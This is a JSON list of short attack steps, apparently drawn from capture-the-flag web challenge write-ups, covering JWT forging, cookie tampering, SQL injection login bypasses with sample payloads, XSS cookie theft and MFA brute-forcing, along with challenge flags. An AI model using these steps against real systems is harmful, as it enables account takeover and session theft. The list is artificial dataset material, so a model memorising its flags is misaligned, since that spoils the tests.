[
    "Discovered the password 'w0rdc0unt123'.",
    "Plugged the password ('w0rdc0unt123') from '$password' variable to the cookie.",
    "Found password 'csictf'.",
    "Switched to the user 'ctf'.",
    "Authenticated using the password 'csictf'.",
    "Look for a JWT in the 'token' header of the responses.",
    "Decode the JWT at jwt.io.",
    "Take note of the 'username' from the form inputs.",
    "Have the intention to alter the 'admin' value.",
    "Recognize that altering the 'admin' value requires the JWT secret.",
    "Have the intention to alter the JWT 'username'.",
    "Examine the request route for '/adminNames'.",
    "Recognize that the '.env' file contains the JWT secret.",
    "Create a new token.",
    "Use the JWT secret and the altered payload for the new token.",
    "Identify headers that require a token.",
    "Recognize the need for an 'Authorization' header.",
    "Identify that the 'Authorization' header should contain a JWT.",
    "Include the correct 'Authorization' header.",
    "Use the new token for authentication.",
    "Note that this method of passing an array satisfies the filename restrictions",
    "Visit the disallowed route",
    "Identify the cookie related to flavor",
    "Replace the existing flavor value in the cookie with 'chocolate'",
    "Replace the original cookie with the new base64 encoded 'chocolate' cookie on the website",
    "Note that the password for the portal is being checked by the script",
    "Understand that the password was split into various parts",
    "Enter the combined password into the portal",
    "Identify the hidden field 'password'",
    "Guess combinations of characters",
    "Reveal the entire password",
    "Extract the admin cookie 'password'",
    "Observe that the server script uses a secure cookie for comparison to display a flag value.",
    "Adjust the value of the secure cookie 'admin' to the desired comparison value 'true'.",
    "Create a signed cookie in the browser.",
    "Replace the original signed cookie with the new one generated.",
    "Verify if all 5 captchas are collected",
    "Set the cookie as 'user=root'.",
    "Assign specific values to variables if challenge is 'Gate keeper'",
    "Check if guessed character is in password",
    "Continue script until full password is discovered",
    "Set the cookie to a given string",
    "Set the new flag value as the cookie",
    "The key for the key-value pair is retrieved from the 'key' variable.",
    "'check' is a predefined string expected in the response of a successful login.",
    "A valid login has been achieved.",
    "Inferred the username to be michelle",
    "Attempted to pass an object in place of password",
    "Understood that 'password' = 'username' evaluates to 0",
    "Used the exploit to log in",
    "Extracted the session cookie",
    "Used the session cookie to visit /flag",
    "Find a cookie that contains a JWT hashed with HS256.",
    "Use rockyou.txt as the wordlist.",
    "Brute force the JWT secret with John The Ripper.",
    "Discover the secret to be 'supersecret'.",
    "Create a JWT with 'username: admin'.",
    "Add the new JWT to the cookie.",
    "Impersonate an admin.",
    "Bypass authentication by making the conditional statement in the SQL query always true due to the SQL Injection.",
    "Identify that the 'member' field within the token object is currently set to 0.",
    "Understand that by adding the necessary characters to the 'username', it is possible to close the double-quote and manipulate the fields following it in the token.",
    "Pass the 'username' value as ','\"member\":\"1' to the function in order to change the value of 'member' to 1.",
    "Capture the Admin Bot's cookies.",
    "Extract the flag from the Admin Bot's cookies.",
    "Intercept the bot's browser cookie.",
    "Retrieve the flag stored in the intercepted cookie.",
    "Identify the 'secret key' as '1234'.",
    "Understand implications for encoding and decoding JWT tokens.",
    "Copy the JWT token from the payload.",
    "Modify the 'role' field to 'Admin'.",
    "Send requests with the newly encoded 'Admin' JWT token to attempt user role update and flag access.",
    "Navigate to the user creation interface on the site.",
    "Create a new user as the default user role is immutable.",
    "Prepare a PATCH request for the new user\u2019s role.",
    "Send the request to modify the new user's role to 'Admin'.",
    "Login using the credentials of the newly promoted 'Admin' user.",
    "Site has a login screen.",
    "Attempt to login using 'user' as both username and password.",
    "Enter the payload 'or 1=1;--' into the 'pass' field to attempt a bypass.",
    "Identified /login and /forgotpassword.html as especially interesting.",
    "Attempted to login with 'admin', 'admin' as username and password.",
    "Failed to login with the provided credentials.",
    "Checked the forgot password feature.",
    "Used the AWS credentials found in the 'config' schema.",
    "Used a private SSH key retrieved from the database for cloning.",
    "Used a malicious cookie value for exploitation.",
    "Understood that the function decodes a user's cookie",
    "Crafted the payload into a representation of a session cookie",
    "Ensured the crafted session cookie matches the expected format used by the application",
    "Delivered the payload via the crafted session cookie",
    "Successfully retrieved the flag",
    "Identify the presence of a form to create users.",
    "Identify the indication of whether users are admins.",
    "Identify the presence of a 'username' attribute in the requests.",
    "Set the 'isAdmin' field to 'true' in the request body.",
    "Note that we can leave a comment on this page.",
    "Determine that it is unusable due to requiring authentication.",
    "Identify the disallowed path '/g00d_old_mus1c.php'.",
    "Check if the Header 'x-captcha-state' is set.",
    "Understand that if the expected value does not match 'solution'.",
    "Identify that the JWT field 'failed' is set to 'true'.",
    "Understand that if the expected value does match.",
    "Identify the problem with brute force.",
    "Identify that the JWT success counter is reset to 0 if the old token is invalid.",
    "Identify that the JWT expiry was not extended for failed solving attempts.",
    "Recognize the potential JWT exploit (CVE-2016-5431/CVE-2016-10555).",
    "Create an account on the website.",
    "Copy the 'session' cookie.",
    "Choose JWT.io or jwt_tool.py as the decoding tool.",
    "Inspect the decoded JWT.",
    "Identify the encoded public key in the JWT.",
    "Edit the JWT.",
    "Add the RS256-to-HS256 exploit to the JWT.",
    "Gain access as an admin user.",
    "Execute the RS256-to-HS256 exploit using python3 jwt_tool.py.",
    "Replace the JWT token with the admin token.",
    "Gain admin access.",
    "The website is a simple login page.",
    "Verify that the `database.sql` file contains password hashes for a manager and admin user.",
    "Use CrackStation to decrypt the hashed passwords.",
    "Verify the obtained credentials: `manager:bigsanta!` and `admin:tryharder`.",
    "Try logging in using `manager:bigsanta!` credentials.",
    "Try logging in using `admin:tryharder` credentials.",
    "Realize that logging in as admin is necessary to access the flag.",
    "Identify a working payload with username `admin' -- ` and any password.",
    "Log in using the working payload and reveal the hidden flag: `HTB{1nj3cti0n_1s_in3v1t4bl3}`.",
    "Our malicious script grabs the current cookies and redirects to our webpage with these cookies as parameters in the request.",
    "Create account at ngrok, download the application, and login.",
    "Finally, input the payload into the frontend for the application.",
    "Discover that the 'auth' cookie was previously set in 'gethash.sh'",
    "Use the previously hardcoded auth cookie value",
    "Evaluate the if statement `0 == 'whatever the password is'`.",
    "Input {{ state.flag }}",
    "Encounter a login page.",
    "Type a random base username and password for the login.",
    "See a page notifying about an incorrect login.",
    "Find a message containing a 'secret key' for the cookies.",
    "Identify the 'secret key' for the site's cookies: flour_sugar_chocolate_and_lotsalove.",
    "Get the cookie's value.",
    "Identify that you need change the 'admin' field to 'true'.",
    "To find the session cookie, set the session's 'admin' field to 'true'.",
    "Use the new session cookie to log into the site.",
    "Input the new cookie.",
    "Discover admin login page.",
    "Perform login.",
    "Receive cookie as a result of successful login.",
    "Inspect the cookie.",
    "Identify the 'admin' field and its value.",
    "Change the value of the 'admin' field to 'true'.",
    "Identified that 'Cheap' can be bought by entering a valid credit card.",
    "Realize that the login site has filters applied to the quotation marks",
    "Login as admin using SQL injection",
    "Log in again with the deduced password to get the flag",
    "Read the information about logging in via POST and using json request",
    "Received the response",
    "Extracted the jwt token from the response",
    "Decrypted the jwt token using jwt.io",
    "Obtained the payload from the decrypted jwt token",
    "Noted the payload as {'user':'guest'}",
    "Identified the need for a valid jwt token",
    "Passed the earlier jwt token as parameter",
    "Identified the need for admin credentials",
    "Edited the existing jwt token",
    "Changed the payload to {'user':'admin'} using jwt.io",
    "Included the newly edited admin jwt token in the request",
    "View the login form",
    "Submit the form with random user credentials",
    "Check the cookies of the webpage",
    "Find a 'token' key in the cookies",
    "Verify that the 'token' key contains a JWT",
    "Analyze the JWT",
    "Note that the token uses the RS256 algorithm",
    "Locate the private key",
    "Create a token",
    "Apply the signature to the token",
    "Set the 'user' payload to 'admin'",
    "Use the retrieved private key for signing",
    "Specify the 'RS256' algorithm for signing",
    "Use the newly generated token as a cookie",
    "Identified the potential for a JWT key confusion attack.",
    "Logged in with a random value.",
    "Found a `token` cookie.",
    "Checked the value of the `token` cookie on jwt.io.",
    "Concluded that a JWT confusion attack is required.",
    "Built an HMAC(HS256) token.",
    "Crafted a token with 'admin' as the user.",
    "Used the crafted token as a cookie.",
    "Enter junk value to log in.",
    "Inspect browser cookies.",
    "Open jwt.io website.",
    "Enter token value.",
    "Verify token using jwt.io.",
    "Retrieve the found secret_key 'redraider'.",
    "Create a new token using HS256 algorithm.",
    "Set the token as a cookie.",
    "Identify that the web application has registration, login, and readfile functionalities",
    "Perform a login using the web application",
    "Obtain a token after successful login",
    "Note that the password length is less than 30 characters",
    "Analyze the application's token verification process",
    "Understand that a valid signature is needed to exploit RCE",
    "Identify that the valid signature can be obtained from the .env file",
    "Discover the requirement to login as an 'admin' user.",
    "Identify the need for a 'token' to perform certain actions.",
    "Identify that the website can't send double opt-in emails",
    "Realize that a user can be registered",
    "Realize that the 'magic code' needed to login won't be received via email",
    "Use the retrieved 'magic code' to complete the login",
    "Identify that a cookie is set after login",
    "Identify that the cookie is set with the flag '35C3_LOG_ME_IN_LIKE_ONE_OF_YOUR_FRENCH_GIRLS'",
    "Receive a note PW.",
    "Identify the password check code.",
    "Find opportunity to bypass the second 'If' statement",
    "Observe the presence of a login form",
    "Analyze the browser cookies",
    "Identify a cookie named 'admin_id : 0'",
    "Locate the 'admin_id' cookie",
    "Analyze the browser cookies.",
    "Find a cookie with the name 'flag'.",
    "Include the caught admin cookies in the request",
    "Note that 'warmup' GET parameter is strictly checked for.",
    "Focus on bypassing checks applied to 'warmup' GET parameter.",
    "Ensure the chosen parameter is non-alphanumeric.",
    "Determine current user is 'www-data'",
    "Discovered two strange cookies: 'frequency' and 'transmissions'.",
    "Discover the requirement of the 'otadmin' cookie",
    "Craft a value for the cookie",
    "Ensure the value is {\"hash\": \"T35T\"}",
    "Use the crafted cookie value",
    "Find the correct value for the cookie 'otadmin' (\"hash\": 389)",
    "Use the discovered cookie",
    "Retrieved the CTF flag.",
    "Was presented with an authentication form displaying the user's IP.",
    "Revealed default credentials.",
    "Used the default credentials.",
    "Logged in.",
    "Attempted to alter the User-Agent during authentication.",
    "Identify JWT 'identity' cookie as '31337'",
    "Identify JWT 'secret' cookie as 'dawgCTF?heckin#bamboozle'",
    "Craft a valid JWT with '31337' identity",
    "Include the crafted JWT in the `Authorization` header",
    "Observe a login page with two authentication options: username and password, or WifiKey.",
    "Recognize the potential CSRF vulnerability based on the CSRF token.",
    "Ensure the known username 'true.grit@umbccd.io' remains intact in the manipulated request.",
    "Discover that 'passcode' values are the first 8 characters of the hashed 'nonce' value.",
    "Apply the same process to the challenge's 'nonce' value.",
    "Enter a common password, e.g., 'password'.",
    "Identify functionalities accessed by authenticated users.",
    "Observe that it is accessed only by authenticated users.",
    "Authenticate into the system.",
    "Create new users upon successful authentication.",
    "Verify authentication to the system.",
    "Observe the 'get_user_info' method during authentication in the User class.",
    "Create a new user.",
    "Attempt authentication with the user created.",
    "Observed the user registration process.",
    "Discovered that the value 'false' is forced into the admin field during the normal registration process.",
    "Crafted a record by setting a password with a ':' character.",
    "Successfully created an admin account.",
    "Used the created admin account to register with the username 'm3ssap0' and password 'pwnd:true'.",
    "Logged in using the newly created admin account.",
    "Bypassed localhost address checks by setting the '$url' attribute to 'file:///var/www/html/config.php'.",
    "Understand that the goal is to exfiltrate the session cookies",
    "Discover a comment in the HTML source code referencing a potential vulnerability using TOTP",
    "Attempt to change the input field from 'password' to 'totp'",
    "Observe the authentication response for a nonexistent user",
    "Observe the authentication response for an existing user with the wrong password",
    "Identified an authentication form on the webpage.",
    "Logged into the authentication form successfully, but noticed the flag didn't print.",
    "Attempted the SQL injection on the authentication form.",
    "Got authenticated as 'flagman69'.",
    "Choose 'discord' as the OAuth2 Identity Provider upon redirection.",
    "Identify the need to bypass server checks",
    "Ensure the user's name and password are equal to the secret",
    "Successful bypass of initial server checks",
    "Bypass further server checks",
    "Access flag",
    "Identify what server-side checks are being done.",
    "Note the session info",
    "Note that the conditional statement sets a cookie with the true flag if certain values are present",
    "Decide to forge the cookies",
    "Obtain the fake flag and the admin's PHP Session ID",
    "Spoof the cookies",
    "Obtain the real flag within the FLAG cookie",
    "Register a user",
    "Escalate privileges",
    "Replace the existing `login` cookie",
    "Use the modified cookie",
    "Identified the 'user_id' column as requiring a foreign key from the user table.",
    "Located Maria's session ID.",
    "Modified the PHPSESSIONID cookie in the browser to Maria's session ID.",
    "Impersonated Maria.",
    "Each page had one letter for the name",
    "Receive a message that this page is for authentication with an API located at port 4000.",
    "Receive an error: Forbidden, missing JWT authorization.",
    "Receive a JWT(token).",
    "Decode the JWT.",
    "Understand its format.",
    "Find out that it has only user privileges.",
    "Use the obtained JWT to authenticate using the /api/normal endpoint.",
    "Receive a message stating flags are not for normal users.",
    "Attempt to use the /api/admin endpoint using the obtained JWT.",
    "Receive a message that the user is not an admin.",
    "Alter the JWT's header to change the algorithm to HS256.",
    "Alter the JWT's payload to change the user type to admin.",
    "Create a new JWT.",
    "Realize the limitations on the maximum attempts from the same IP address",
    "Understand that the IP address used to generate the token cannot be used to extract it",
    "Decide to generate the token from one IP address",
    "Attempt to discover the generated token",
    "Reset the session",
    "Retrieve the discovered full token",
    "Attempt to access common pages like foo.php.",
    "Recognize that the username taken from the session is not properly sanitized",
    "Find the usage of the username after authentication",
    "Register a user with the malicious username input",
    "Login with the registered user once",
    "Logout",
    "Re-login",
    "Log in with the found user 'root'",
    "Enter the password 'jjLLgTGk3uif2rKBVwqH'",
    "Enter the username and password",
    "Received a 'HTTP 403 Forbidden' error, suggesting the '.bzr' directory's presence.",
    "Determine that the certificate seems invalid.",
    "Web page performs a password reset function using security questions",
    "Security questions are related to Alan Turing's account recovery",
    "Determine the correct answers to the security questions",
    "Enter 'Stoney' for Mother's Maiden Name",
    "Enter 'St. Michael's' for First School Attended",
    "Enter 'Science' for Favorite Primary School Subject",
    "Enter 'Marathon' for Favorite Olympic Event",
    "Check if the password is the flag",
    "Receive a page showing successful entry and the flag",
    "Observe the cookie 'not_admin' after form submission",
    "Alter the value of the 'not_admin' cookie",
    "Analyze the cookies.",
    "Pass the encoded content into the cookie.",
    "Login using the found password.",
    "After logging in, retrieve the flag 'TUCTF{H1gh_S0urc3_3qu4ls_L0ng_F4ll}' from the site.",
    "Aim to steal the VIP user's cookies.",
    "Identify incoming cookies from the victim's browser.",
    "Observe cookies carrying the 'secret' cookie.",
    "Note that the 'secret' cookie contains the flag.",
    "Realize that the password is the flag.",
    "Understood the voting system of the webpage.",
    "Ensured the voting process continues until more than 250 votes are cast in the same PHP session.",
    "Note that the username is 'backd00r' and the password is 'catsrcool'.",
    "Notice that the login occurs only if the user's IP address is one of the whitelisted IP addresses or when the debug mode is enabled.",
    "Receive an error message that the IP address was not in the whitelist.",
    "Realize that the endpoint can be accessed without authentication.",
    "Reveal that session data is stored as a serialized pickle python object.",
    "Create a script to modify the sessionID to valid lua.",
    "Refresh the CSRF token.",
    "Identify the received flag as a cookie in the HTTP GET request",
    "The execution of '.bashrc' occurs when the user 'manhndd' SSH-es into the server",
    "Injected Carriage Return Line Feed (CRLF) in the username field",
    "Log in using user credentials",
    "Enter new user_id and password",
    "Log in using new user_id and password",
    "Leak data byte-by-byte by hashing it and using as password for new account",
    "Bruteforce password at :7777 to determine the leaked byte",
    "Cycle between accounts due to 1 minute delay in database reset on new site",
    "Set 'flagConverted' on the previously set sessionID.",
    "Identify the presence of a tripcode",
    "Identify the correct matching tripcodes",
    "Log in as admin",
    "Access unauthorized data or perform unauthorized actions.",
    "Control 'Version' in cookie.",
    "Decode the jwt cookie",
    "Set up a request with malicious cookie data",
    "Bypassed duration check",
    "Used leaked secret key",
    "Faked session with 'is_admin' privileges",
    "Target only admin endpoint.",
    "Utilize hardcoded key.",
    "Bypass the X-Real-IP protection.",
    "Enter an empty username and arbitrary password.",
    "Successfully log in to the system.",
    "Use the encoded payload to bypass the WAF 'Skynet'.",
    "Used the website functionality to get the uploaded PDF file signed.",
    "The server recognized the signature and provided the flag.",
    "Log into the website.",
    "Log in to investigate any intermediate requests.",
    "Submitted the flag.",
    "Identify the need to steal the identifier",
    "Identify the need to use a valid identifier to steal the data",
    "Observe from user session that the identifier is stored",
    "Observe from user session that the session cookie was set to Lax",
    "Acknowledge that the challenge involves bypassing origin check",
    "Steal the identifier from the pop-up",
    "Recognize that the challenge focuses on hacking the JWT cookie",
    "Understand that to obtain the flag, the secretid must match the length of the secrets array and the permissions must be set to 'admin'",
    "Identify that the server adds a new secret to the secrets array every time a cookie is signed",
    "Note that the server does not perform security checks on the alg or secretid fields in the JWT",
    "Create a JWT with the permissions set to 'admin' and the secretid set to a string that does not exist in the secrets array",
    "Send the malicious JWT to the server",
    "Note that the server will retrieve a value of 'undefined' for secret['randomstr'] and will not attempt to verify the JWT because the algorithm is 'none'",
    "Observe that this allows the server to pass the security checks and flag the token as true",
    "Notice the particular cookie",
    "Find admin cookie",
    "Capture admin's cookie",
    "Submit the admin's cookie",
    "Query the protection of the website by CSRF tokens.",
    "Find out that the website isn't protected by CSRF tokens but employs SameSite=Lax cookies.",
    "Decide on the challenge to change the admin's password.",
    "Log in using the newly changed credentials of the admin account.",
    "Retrieved the flag: actf{traversed_the_world_and_the_seven_seas}",
    "Assign different nonce to each script tag",
    "Obtain the admin's cookie",
    "Understand that the goal is to fetch all of the password's characters.",
    "Find that the password is 'congratsyouwin' via the bruteforcing method.",
    "Use the retrieved password to get the flag: actf{still_no_sql_in_the_sequel}.",
    "Compose a JSON body with 'username': 'admin'.",
    "Create a manipulated cookie for bypassing session-based authentication.",
    "Check the response of the POST request for a session cookie.",
    "Identify and store the authenticated session cookie for 'admin' from the response.",
    "Inject the authenticated session cookie into the browser or curl.",
    "Devise a strategy involving acquiring the secret key from the store object.",
    "Plan to sign a 'jwt' with a controlled object to purchase a 'flag' for $1.",
    "Create a token with the overridden '[object Object]' as the secret key.",
    "Login to the website",
    "Register an account on the website",
    "Edit the user profile on the website",
    "In the 'Support' section, users can send two types of messages to the admin: 'Problems with Profile' and 'Get premium account', which needs 'Link to profile' and 'Message'",
    "This page is the admin's tool for changing 'user status' to 'premium'",
    "Both 'profile.php' and 'manage.php' are protected by a 'hidden token'",
    "these tokens are associated with the current session",
    "Referrer different from 'web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one'",
    "Attempted to change status to 'premium'",
    "Received 'Permission Denied!' message",
    "Provide 'Link to profile' and 'Message' in the selected message type",
    "Determine the purpose of the 'manage.php' page: changing 'user status' to 'premium'",
    "Identify the 'hidden token' protection",
    "Note that the tokens are associated with the current session",
    "Attempt to change status to 'premium'",
    "Note that the only missing piece is the 'token'",
    "Identify that an attacker has set up a keylogger.",
    "Identified the task as finding the correct password",
    "Understand that the input format for the SQL injection should match the UUID format.",
    "Gain admin access.",
    "Bypass the restriction caused by the referrer header.",
    "Add the attacker's email to the admin's shared list.",
    "Face a password prompt.",
    "Notice that clicking on 'Facebook', 'Google' or 'Twitter' buttons attaches the note id and password to the shared URL.",
    "Try to implement a similar mechanism to the CSRF mechanism used earlier.",
    "Grab the password.",
    "Attempt to log in the admin to a dummy Twitter account.",
    "Try different versions of the Twitter login page.",
    "Authenticate on behalf of the admin without success.",
    "Try to generate 'oauth tokens' for the flag note.",
    "Intercept 'oauth tokens' by stopping the request from 'twitter' to 'yeunote'.",
    "Identified task to bypass countermeasures.",
    "Managed to bypass the 'strpos(urldecode($remote),'..')' condition.",
    "Managed to bypass the 'parse_url($remote, PHP_URL_HOST)' condition.",
    "Had the right PHPSESSID in cookies.",
    "Found a way to bypass the Angular application.",
    "The '/debug/answer' endpoint was restricted by both Nginx and the application.",
    "Successfully bypassed restrictions.",
    "Successfully obtained the flag {you-have-to-eat-tomato-yume-chan!} as a result of the bypass.",
    "Used the provided bypass.",
    "Identified that the challenge seemed to involve reCAPTCHA.",
    "Add the first A record to the DNS entry to resolve to 127.0.0.1.",
    "Add the second A record to the DNS entry to resolve to 51.38.138.162.",
    "Decide to use burpsuite to bypass the front-end input sanitization.",
    "Aim to extract the password serving as the flag.",
    "Attempt authentication bypass with advanced payloads.",
    "Confirm presence of characters in the password.",
    "Confirm that the flag begins with 'CHTB{'.",
    "Check successful log-in messages to determine correct characters.",
    "Observed login page.",
    "Received a JWT session token.",
    "Decoded the JWT token.",
    "Sent a request to update the password via XHR.",
    "Logged in with the new password.",
    "Logged back in with escalated privileges.",
    "Observe login page with no additional information.",
    "Capture the login request.",
    "Log in using extracted credentials.",
    "Noticed password verification with passwordVerify.",
    "Logged in with the obtained credentials.",
    "Notice an option to register a new account.",
    "The 'Mutation' query allows change of a user password.",
    "Use the 'UpdatePassword' mutation.",
    "Change the admin account's password.",
    "Log into the admin account.",
    "Use the new password.",
    "Enter the correct pin.",
    "Enter the username 'admin'",
    "Enter the password 'admin'",
    "Submit the authorization request",
    "Discover the existence of an admin login page",
    "Discover the login credentials in the logs",
    "Enter an apostrophe in the username field.",
    "Enter an apostrophe in the password field.",
    "Enter an apostrophe in both the username and password fields.",
    "Enter blank input enclosed in two apostrophes in the username field.",
    "Enter a single apostrophe in the password field.",
    "Enter blank input enclosed in two apostrophes in both the username and password fields.",
    "Enter username 'admin' and password 'admin' to login.",
    "Retrieve the flag value 'flag{th3_an5w3r_w4s_HSCTF_0bvi0us1y}'.",
    "Log in using the provided credentials.",
    "Observe the presence of a cookie named userData with userID and username.",
    "Discover that the correct user id is required for admin access, not the password.",
    "Replace the username with 'admin'.",
    "Change the cookie values: userID to 768 and username to 'admin'.",
    "Constructed a JSON body with username and password",
    "Understood that it is possible to set custom values for 'salt' and 'hash'",
    "Recognized that any values can be used for 'username', 'password', and 'salt' as long as the if condition is met",
    "Start at a login/register page.",
    "Login into the system.",
    "Understand how to modify user's profile and upload images.",
    "Understand the need to 'steal' an admin cookie and gain admin access.",
    "Attempt to follow admin.",
    "Embed the 'id' of the attacker's user in the request body.",
    "Locate the JWT token within the session cookie.",
    "Send the POST request to '/profile/request' with the 'id' of the attacker's user to gain admin's acceptance as a follower.",
    "Include session ID in the request.",
    "Fill out registration form.",
    "Add 'account[role]' parameter with value 'admin'.",
    "Verify admin privilege.",
    "Performed the action of claiming the Free Flag.",
    "Face an obstacle due to the password length exceeding the character limit of the login page",
    "Recognize an alternative method to bypass the login via the username field",
    "Discover an alternative approach to bypass authentication",
    "Identify the password field as the entry point for bypassing authentication",
    "Identify User Registration section.",
    "Identify User Login section.",
    "Identify Admin Login section.",
    "Proceed with user registration.",
    "Inspect the cookies.",
    "Locate the admin cookie.",
    "Locate the authenticated-user cookie.",
    "Locate the made-an-account cookie.",
    "Locate the visited-main-page cookie.",
    "Modify the value of the admin cookie.",
    "Notice that one gallery is set to private.",
    "Realize that the private gallery cannot be unnecessarily accessed.",
    "Try to access the admin panel of the website.",
    "Successfully log into the admin panel.",
    "Untick the box to make the private gallery public.",
    "Receive a notice that the request body must be JSON.",
    "Receive an error for missing launch time.",
    "Receive an error message indicating pumpId was missing.",
    "Submit a blank value for the 'n' parameter in the web application.",
    "Verify that the web application does not reject the submission of duplicate 'n' parameters.",
    "Locate a valid credential.",
    "Use the located credential.",
    "Acquire the flag upon login.",
    "Identify the presence of a potential password.",
    "Logged in as dennisb@uupeye.edu",
    "Tried to bruteforce the admin portal without success",
    "Attempted SQL login bypass",
    "Successfully bypassed login and accessed the admin portal",
    "Identify that students may have weak passwords",
    "Attempt password brute force for each email",
    "Attempt different passwords",
    "Access all accounts with the obtained credentials",
    "Initialize an empty password string.",
    "Set the loop condition to run until the password is fully determined using the SQL Injection.",
    "Check the response for the text 'No such person'.",
    "If the text is found, the guess was incorrect.",
    "If the text is not found, the guess was correct.",
    "Log in to the website using the username 'jack' and the discovered password.",
    "Notice a 'session_id' stored in a cookie.",
    "Experiment with the session_id.",
    "Change the hashed value to correspond to different usernames.",
    "Change the hashed value in the session_id cookie to correspond to the username 'admin'.",
    "When faced with a security check.",
    "Discover the security question answer from one of the images.",
    "Use the discovered security question answer to bypass the security check and log in as the 'admin' user",
    "Identify that the cookie 'token' has the httpOnly attribute.",
    "Recognize that the httpOnly attribute prevents retrieval of the cookie by XSS.",
    "Refer to the PHP manual to obtain the bcrypt hash and identify the password as 'rasmuslerdorf'.",
    "Add the encoded 'userdata' as a request parameter for the mfa service.",
    "Retrieve the flag as confirmation of successful authentication.",
    "Examine the cookies in the HTTP request.",
    "Observed that 'c' parameter in requests was used to manipulate the user session, either to sign in, sign up, or sign out.",
    "Figured out the need of a passcode to perform admin functions.",
    "Identified admin credentials and passcode from the accessed user database and passcode files.",
    "Identify remote address and user agent checks as the reasons.",
    "Identified that 'ctx.state.user' equals to the 'username' cookie",
    "Used '__proto__' as the username parameter",
    "Identify that the re-writing and forwarding occurs when the `User-Agent` header is of the web crawlers.",
    "Realize that 'jsonwebtoken' 3.2.2 has a known authentication bypass vulnerability.",
    "Notice that the JWT token is checked in the response for '/localisation-file'.",
    "Understand that the JWT token is essentially encoded JSON data.",
    "Understand that the JWT token is signed and verified on the server-side.",
    "Notice that the public key used for the JWT token handling is stored in the '__dirname' directory.",
    "Discover that the server generates a JWT token.",
    "Realize that the input 'language' in the JWT token is used for reading the arbitrary files.",
    "Set the 'language' parameter to 'key' in the JWT token.",
    "Sign the token using the retrieved public key.",
    "Verify that the token is successfully signed.",
    "Use the server's own mechanism against it.",
    "Set the 'lion-token' cookie to the generated token.",
    "Understand that \u2018SCRIPT_NAME\u2019 can be set through an HTTP header, which can bypass the '/admin' denial in Nginx configuration",
    "Obtain the flag",
    "Submit an authentication request with a username.",
    "Fail the authentication.",
    "Determine that the 'notes.count' function is unauthenticated.",
    "Change session username to 'root' using client-side cookies.",
    "Sign the Flask cookie with the desired username to authenticate as 'root'",
    "Separate user accounts were used.",
    "Messages were signed using ED25519.",
    "Signing was done to prevent tampering.",
    "Messages and signatures were verified by the frontend.",
    "GET query parameters were added to the messages before verification.",
    "Created new user with username 'FRONTEND_USERNAMEamount1337' to manipulate the message format.",
    "Server was able to provide signature for this manipulated message.",
    "Signed up on the website.",
    "The bash script would only spawn the shell if the caller is root",
    "If the history length is not three, the balance is exceeded.",
    "Discovered that using 'test' or 1-- - can obtain possible account credentials",
    "Message is only sent to the intended receiver",
    "User's cookies are sent along with the POST request",
    "Server code for /api/filter endpoint returns the hash of the user's token in the response",
    "Received the admin's hash on the exploit server",
    "Admin's token access is required to access the flag",
    "Recognize the XSS prevention methods implemented by the site.",
    "Inject a Set-Cookie header to set the admin's ID cookie to your own session.",
    "Preserve the original admin's ID.",
    "Set malicious cookies.",
    "Make a callback to our server with the data.",
    "Identify the need to overwrite the <userID>_isAdmin value.",
    "Discover the PHP sessions are file-based.",
    "Identify the capability of setting the 'theme' value in the session using the 'theme' GET query parameter.",
    "Understand the possibility of accessing the session file through the LFI vulnerability.",
    "Given login credentials for an online portal with MFA and Captcha code protection.",
    "Notice a 'login_session_token' is received upon login attempt.",
    "Identify that the 'login_session_token' is used when making a query to 'mfa_service.php'.",
    "Discover that there is no limit to the number of attempts made with the same token, as long as correct CAPTCHA code is provided.",
    "Successfully use the same CAPTCHA code to test two different MFA tokens by sending them both in the same HTTP request.",
    "Understand that MFA token is only 4 digits and take advantage of this limited search space by sending batches of thousands of queries together, thereby reducing the number of required CAPTCHA responses.",
    "Found a successful login attempt among the batched requests.",
    "Obtained the flag `MetaCTF{if_brute_force_doesnt_work_use_more_brute_forceeeeeeee}`.",
    "Identified lack of validation for 'Content-Length' headers as the cause of the vulnerability.",
    "Identified the usage of 'Content-Length' header with 'Transfer-Encoding' header as a request smuggling vulnerability.",
    "Recognized the presence of admin's 'Cookie' and 'X-Access' headers.",
    "Viewed the admin's cookie and 'X-Access' headers.",
    "Used the admin's cookies to visit 'private.php'.",
    "Registration process was completed in the system.",
    "Utilized two accounts for user enumeration.",
    "Successfully established the ability to enumerate usernames at `/users/<username>`.",
    "Observed server side validation for valid user during file retrieval at `/users/<username>/files/<filename>`.",
    "Log into the application",
    "Submit the registration form",
    "Escalate privileges",
    "Verify that the role was changed to 'admin'",
    "Identify the input fields for the login function.",
    "Determine that the input fields for the login function are 'username' and 'password'.",
    "Bypass the login function successfully due to successful SQL injection.",
    "Recognize the challenge.",
    "Note the challenge is related to cookie manipulation.",
    "Notice the cookies.",
    "Observe cookies being set at every stage of authentication.",
    "Recognize the necessity.",
    "Note certain cookies are required.",
    "Understand the goal is to gain access to '/admin'.",
    "Inject another cookie.",
    "Inject a further cookie.",
    "Name the cookie 'made-an-account'.",
    "Assign the value 'true' to the cookie.",
    "Name the cookie 'authenticated-user'.",
    "Assign the value 'true' to the cookie.",
    "Use the manipulated cookies to gain access.",
    "Understand the requirements to pass the login authentication that includes correct username, password, and a Multi-factor Authentication (MFA) token.",
    "Identify the hardcoded username.",
    "Confirm the password from a known resource.",
    "Realize that initialization of the 'mfa' attribute as a reference to the '_correctValue' attribute allows to bypass the MFA check.",
    "Verify the user data.",
    "Check the IP address against the whitelist.",
    "Use the dumped admin credentials to login to the first webpage.",
    "Use the remaining dumped credentials to login to the Admin page and access the flag.",
    "Check the cookies.",
    "Unlock the flag and source code using the uploaded PDFs.",
    "Find that the '/display' page checks the session cookie.",
    "Identify the `very_auth` session variable that needs to be set to `admin`.",
    "Discover that the Flask session secret key is hardcoded into the source code.",
    "Realize that the secret key is selected randomly from an array of cookie names.",
    "Extract the text before the period (.) from the Flask session cookie.",
    "Notice that the remainder of the session cookie is a signature.",
    "Understand that the signature is checked server-side to prevent tampering.",
    "Realize that the secret key needs to be cracked.",
    "Discover that the secret key is 'butter'.",
    "Craft a new session cookie with the `very_auth` variable set to 'admin'.",
    "Utilize the secret key for crafting the new session cookie.",
    "Obtain a new session cookie as output.",
    "Place the newly crafted cookie back into the application using Burpsuite.",
    "The flag retrieval is possible due to the deserialization of the 'login' cookie",
    "Decide to add the base64-encoded serialized object as a 'login' cookie in the browser",
    "Logged in as admin using the discovered SQL injection",
    "If identified, manipulated the XPath query to bypass authentication mechanisms of the application.",
    "Confirmed the XXE vulnerability.",
    "Set up a server to catch the redirected request with admin cookies",
    "Authenticated as admin and explored login.php",
    "Received a 403 Forbidden error from the login.php page.",
